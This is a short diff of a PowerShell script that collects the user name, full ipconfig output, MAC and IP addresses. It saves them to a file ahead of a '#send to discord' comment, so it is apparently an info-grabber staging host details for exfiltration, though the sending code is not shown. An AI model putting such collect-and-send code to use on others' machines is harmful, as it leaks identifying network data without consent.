@@ -15,9 +15,9 @@ $whoami_content = whoami
 
 ipconfig /all | Out-File -FilePath "$e\ipcfg.txt" # save ipconfig as a file
 
-$mac=(ipconfig /all | findstr /R "Physical")
-$ipv6=(ipconfig /all | findstr /R "IPv6")
-$ipv4=(ipconfig /all | findstr /R "IPv4")
+$mac  = (Get-NetAdapter).MacAddress
+$ipv4 = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
+$ipv6 = (Get-NetIPAddress -AddressFamily IPv6).IPAddress
 
 #send to discord
 
